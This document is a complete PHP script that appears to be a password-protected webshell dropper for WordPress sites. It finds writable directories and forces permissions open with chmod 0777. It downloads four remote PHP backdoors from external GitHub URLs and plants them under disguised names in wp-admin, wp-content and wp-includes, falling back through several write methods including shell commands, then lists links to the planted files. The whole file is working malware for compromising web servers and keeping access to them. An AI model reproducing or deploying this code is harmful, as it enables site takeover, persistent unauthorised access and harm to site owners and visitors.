<?php
session_start();
if(isset($_POST['p'])&&md5($_POST['p'])==='d2ac32e14d651b9ed03f26f845a11597')$_SESSION['l']=1;
if(isset($_GET['o']))unset($_SESSION['l']);
if(empty($_SESSION['l'])){echo '<form method="post"><input type="password" name="p"><input type="submit" value="Go"></form>';exit;}

$urls = [
    'https://github.com/A3rr0rM/aa/raw/refs/heads/main/wp-admin.php',
    'https://github.com/A3rr0rM/aa/raw/refs/heads/main/wp-info.php',
    'https://github.com/Mr-X1337/xxx/raw/refs/heads/main/jk.php',
    'https://github.com/A3rr0rM/bb/raw/refs/heads/main/foxv6.php'
];

if (!function_exists('a3_scan_dir')) {
    function a3_scan_dir($d,$l=0,&$r=[],$m=6,&$c=0){
        $max=3000;
        if($l>$m||$c>$max||!@is_readable($d))return;
        
        if($l===0&&function_exists('shell_exec')&&is_callable('shell_exec')){
            $cmd="find ".escapeshellarg($d)." -maxdepth $m -type d -writable 2>/dev/null | head -n 100";
            $out=@shell_exec($cmd);
            if($out){
                foreach(explode("\n",trim($out)) as $line){
                    if($line&&@is_dir($line)&&@is_writable($line)){
                        $r[]=[$line,substr_count(str_replace($d,'',$line),'/')];
                    }
                }
                if(!empty($r))return;
            }
        }
        
        $h=@opendir($d);
        if($h){
            while(($i=@readdir($h))!==false){
                if($c>$max)break;
                if($i==='.'||$i==='..')continue;
                $p=rtrim($d,'/\\').'/'.$i;
                if(@is_dir($p)){
                    $c++;if(@is_writable($p))$r[]=[$p,$l+1];
                    a3_scan_dir($p,$l+1,$r,$m,$c);
                }
            }
            @closedir($h);return;
        }
        
        $g=@glob(rtrim($d,'/\\').'/*',GLOB_ONLYDIR);
        if($g){
            foreach($g as $p){
                if($c>$max)break;
                $c++;if(@is_writable($p))$r[]=[$p,$l+1];
                a3_scan_dir($p,$l+1,$r,$m,$c);
            }
        }
    }
}

$rt=rtrim($_SERVER['DOCUMENT_ROOT'],'/\\');
$wA=$rt.'/wp-admin';
$pd=[$wA,$rt.'/wp-content',$rt.'/wp-includes'];
$sp=[];$wD=null;$all=[];$scanCount=0;

foreach($pd as $d){
    if(is_dir($d)&&is_readable($d)){
        $t=[];if(is_writable($d))$t[]=[$d,0];
        a3_scan_dir($d,0,$t,6,$scanCount);
        foreach($t as $x)$all[]=$x;
    }
}

if(!$all){
    $t=[];if(is_writable($rt))$t[]=[$rt,0];
    a3_scan_dir($rt,0,$t,6,$scanCount);
    $all=$t;
}

if($all){
    usort($all,function($a,$b){return $b[1]<=>$a[1];});
    foreach($all as $v)if(!in_array($v[0],$sp))$sp[]=$v[0];
}

foreach($sp as $p)if(strpos($p,$wA)===0){$wD=$p;break;}
$fallbackPaths = [
    $rt . '/wp-content',
    $rt . '/wp-admin/network',
    $rt . '/wp-includes/assets'
];
foreach($fallbackPaths as $fp) {
    if(!is_dir($fp)) @mkdir($fp, 0777, true);
    if(is_writable($fp) && !in_array($fp, $sp)) $sp[] = $fp;
}

if(!$sp)$sp=is_writable($rt)?[$rt]:[sys_get_temp_dir()];

if(!function_exists('a3_wp_write_file')){
    function a3_wp_write_file($p,$c,$u){
        $success = false;

        // AGGRESSIVE CHMOD BYPASS: Temporarily unlock directory and file
        $dir = dirname($p);
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        
        $file_perms = false;
        if (file_exists($p)) {
            $file_perms = @fileperms($p);
            @chmod($p, 0666);
        }

        // STRATEGY 1: Pure Native PHP
        if(@file_put_contents($p,$c)!==false){
            $success = true;
        } else {
            // STRATEGY 2: WP_Filesystem (Best for CMS lockdowns)
            global $wp_filesystem;
            $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
            if(empty($wp_filesystem) && file_exists($wp_admin_path)){
                if (!defined('ABSPATH')) {
                    $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                    if(file_exists($wp_load)) @require_once($wp_load);
                }
                if (defined('ABSPATH')) {
                    @require_once(ABSPATH.'/wp-admin/includes/file.php');
                    if(function_exists('WP_Filesystem')) WP_Filesystem();
                }
            }
            
            $chmod_file = defined('FS_CHMOD_FILE') ? FS_CHMOD_FILE : 0644;
            if(!empty($wp_filesystem)){
                if(@$wp_filesystem->put_contents($p,$c,$chmod_file)){
                    $success = true;
                } elseif(function_exists('wp_tempnam') && function_exists('download_url')) {
                    $temp_file=@wp_tempnam($u);
                    if($temp_file){
                        $downloaded=@download_url($u);
                        if(!is_wp_error($downloaded)){
                            if(@$wp_filesystem->copy($downloaded,$p,true,$chmod_file)){
                                $success = true;
                            }
                            @unlink($downloaded);
                        }
                    }
                }
            }
            
            // STRATEGY 3: fopen/fwrite
            if(!$success && $f=@fopen($p,'wb')){
                $w=@fwrite($f,$c);@fclose($f);
                if($w!==false) $success = true;
            }
            
            // STRATEGY 4: copy
            if(!$success && @copy($u,$p)){
                $success = true;
            }

            // STRATEGY 5: System Level Copies (OS Bypass) & The `/tmp` Bridge
            if (!$success && $c !== false && $c !== '') {
                $tmp_save = sys_get_temp_dir() . '/' . uniqid('a3_') . '.tmp';
                if (@file_put_contents($tmp_save, $c)) {
                    if (function_exists('shell_exec') && is_callable('shell_exec')) {
                        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                            ? "copy /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($p)
                            : "cp -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($p);
                        @shell_exec($cmd);
                        if (file_exists($p) && filesize($p) > 0) $success = true;
                    }

                    if (!$success) {
                        if (@rename($tmp_save, $p)) {
                            $success = true;
                        } elseif (function_exists('shell_exec') && is_callable('shell_exec')) {
                            $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                                ? "move /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($p)
                                : "mv -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($p);
                            @shell_exec($cmd);
                            if (file_exists($p) && filesize($p) > 0) $success = true;
                        }
                    }
                    @unlink($tmp_save);
                }
            }
        }

        // Restore perms
        if ($file_perms !== false) @chmod($p, $file_perms);
        if ($dir_perms !== false) @chmod($dir, $dir_perms);

        return $success;
    }
}

$df=[];$ap=$sp;$errors=[];
foreach($urls as $i=>$u){
    $c=@file_get_contents($u);
    if($c===false&&function_exists('curl_init')){
        $ch=@curl_init($u);
        @curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        @curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
        @curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
        $c=@curl_exec($ch);@curl_close($ch);
    }
    
    if($c!==false&&!empty($c)){
        $ext=pathinfo(parse_url($u,PHP_URL_PATH),PATHINFO_EXTENSION);
        if(!$ext)$ext='php';
        
        $sv='';
        if($i===0&&$wD!==null){
            $sv=$wD;
            if(($k=array_search($wD,$ap))!==false)unset($ap[$k]);
        }else{
            if(!$ap)$ap=$sp;
            $k=array_rand($ap);$sv=$ap[$k];unset($ap[$k]);
        }
        
        if($i===0){
            $fn=basename(parse_url($u,PHP_URL_PATH));
            if(!$fn)$fn='index.'.$ext;
        }else{
            $dn=preg_replace('/[^a-zA-Z0-9_\-]/','',basename(rtrim($sv,'/\\')));
            if(!$dn)$dn='index';
            $fn=$dn.'.'.$ext;
        }
        
        $lp=rtrim($sv,'/\\').'/'.$fn;
        
        $original_fn = pathinfo($fn, PATHINFO_FILENAME);
        while(file_exists($lp)){
            $fn = $original_fn . '_' . rand(1000, 9999) . '.' . $ext;
            $lp = rtrim($sv,'/\\').'/'.$fn;
        }
        
        if(a3_wp_write_file($lp,$c,$u)){
            $df[]=[$lp,$u];
        } else {
            $errors[]="Failed to write file to: $lp (Permission Denied by Server)";
        }
    } else {
        $errors[]="Failed to download URL: $u";
    }
}

if($df){
    echo"<h2>✅ Successfully Upload & Saved Files:</h2>";
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME'];
    foreach($df as $d){
        $url=str_replace('\\','/',str_replace($rt,'',$d[0]));
        if(strpos($url,'/')!==0)$url='/'.$url;
        $fullUrl = $protocol . $domain . $url;
        echo"<a href='$fullUrl' target='_blank'>$fullUrl</a><br>";
    }
} else {
    echo"<h2>❌ No files were downloaded successfully.</h2>";
}

if(!empty($errors)){
    echo "<h2 style='color:red;'>⚠️ Errors Encountered:</h2><ul>";
    foreach($errors as $err) echo "<li style='color:red;'>$err</li>";
    echo "</ul>";
}
